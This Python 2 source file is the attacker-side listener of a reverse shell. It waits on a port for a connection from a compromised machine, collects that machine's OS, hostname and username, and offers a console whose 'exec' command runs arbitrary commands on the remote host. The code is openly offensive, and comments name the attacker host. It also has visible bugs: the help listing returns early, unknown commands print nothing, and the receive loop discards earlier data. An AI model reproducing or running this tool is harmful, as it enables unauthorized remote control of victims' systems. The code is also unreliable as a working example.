import socket, sys, os

def script_color(color_type, text):
    color_end = '\033[0m'
    if color_type.lower() == 'r' or color_type == 'red':
        red = '\033[91m'
        text = red +text+color_end
    elif color_type.lower() == 'g' or color_type.lower() == 'green':
        green = '\033[92m'
        text = green +text+color_end
    elif color_type.lower() == 'lgray':
        gray = '\033[2m'
        text = gray + text +color_end
    elif color_type.lower() == 'gray':
        gray = '\033[90m'
        text = gray + text +color_end
    elif color_type.lower() == 'strike':
        strike = '\033[9m'
        text = strike + text + color_end
    elif color_type.lower() == 'underline':
        underline = '\033[4m'
        text = underline + text + color_end
    elif color_type.lower() == 'b' or color_type.lower() == 'blue':
        blue = '\033[94m'
        text = blue + text + color_end
    elif color_type.lower() == 'y' or color_type.lower() == 'yellow':
        yellow = '\033[93m'
        text = yellow + text + color_end
    else:
        return text
    return text
def banner():
    banner = '''
    ##############################################################################################
    #                                                                                            #
    #                     #
    #                   #
    #                  #
    #                 #
    #
    #
    #
    #
    #
    #
    #
    ###############################################################################################
    '''
    return script_color('y', banner)

def main_control():
    try:
        host = sys.argv[1] # Attacker's host address , usually ''
        port = sys.argv[2] # Attacker host Port
    except Exception as e:
        print script_color('red', '[-]') + "scoket information not provided"
        sys.exit(1)

    print script_color("g","[+]")+script_color("b","Framework Started Successfully")
    print banner()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 8899
    s.bind((host, port))
    s.listen(5)

    if host == "":
        host = 'localhost'

    print script_color('g',"info") + script_color('b',"listening on %s|%d ..." % (host, port))

    try:
        conn, addr =s.accept()
    except KeyboardInterrupt:
        print "\n\n"+ script_color("red","[-]")+script_color("b","Request An Interrupt")
        sys.exit(0)
    console(conn, str(addr[0]))

def console(conn,address):
    print script_color("g", "[ info ]")+script_color("b", "Connection Established from : %s\n" % address)

    sysinfo = conn.recv(2048).split(",")

    x_info = ''
    x_info += script_color("g", "operating system: ") +'%s\n' % script_color("b", sysinfo[0])
    x_info += script_color("g", "computer name: ") +'%s\n' % script_color("b", sysinfo[1])
    x_info += script_color("g", "username: ") +'%s\n' % script_color("b", sysinfo[5])
    x_info += script_color("g", "release verson: ") +'%s\n' % script_color("b", sysinfo[2])
    x_info += script_color("g", "system version: ") +'%s\n' % script_color("b", sysinfo[3])
    x_info += script_color("g", "machine architecture: ") +'%s\n' % script_color("b", sysinfo[4])

    user = sysinfo[5]+ '@'+ address

    while 1:
        command = raw_input(" " + script_color("underline", script_color("lgray", "%s" %(user))) + " " + script_color("lgray", ">") + " ").strip()

        if command.split(" ")[0] == "exec":
            if len(command.split(" ")) == 1:
                print script_color("r", "\n[!] ") +script_color("b", "command: exec <command>")
                print script_color("g", "execute argument as command on remote Host\n")
                continue
            res = 1
            msg = ""
            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1
            response = send_data(conn, "exec "+msg)
            if response.split("\n")[-1].strip() != "":
                response += "\n"
            if response.split("\n")[0].strip() !="":
                response += "\n" + response
            for x in response.split("\n"):
                print " " + x
        elif command == "":
            continue
        elif command == "cls":
            dp = os.system("clear")
        elif command == "help":
            print script_color("lgray", help())
        elif command == "sysinfo":
            print "\n" + script_color("gray",x_info ) + "\n"
        elif command == "exit()":
            conn.send("exit()")
            print script_color("b", " [+] ") + script_color("g", "shell going down")
            break
        else:
            script_color("red", " [!] unknown command ")



def send_data(connection, data):
    try:
        connection.send(data)
    except socket.error as e :
        print script_color("red", "[-]") + "unable to send data"
        return
    result = connection.recv(2048)
    total_size = long(result[:16])
    result = result[16:]

    while total_size > len(result):
        data = connection.recv(2048)
        result = data
    return result.rstrip("\n")


def help():
    help_list = {}
    help_list['sysinfo'] = 'display remote systenm information'
    help_list['exec'] = 'execute command on remote host'
    help_list['exit()'] = 'exit and send halt command to remote host'
    help_list['cls'] = 'clear the terminal'
    help_list['help'] =  'pring help message'

    return_str = script_color("g", "\n command ") + " - "
    return_str += script_color("b", " description\n %s\n" % (script_color("gray", "." * 50)))

    for x in sorted(help_list):
        dec = help_list[x]
        return_str += " " + script_color("g", x) + " . " + script_color("b",dec + "\n")
        return return_str.rstrip("\n")

if __name__ == '__main__':
    main_control()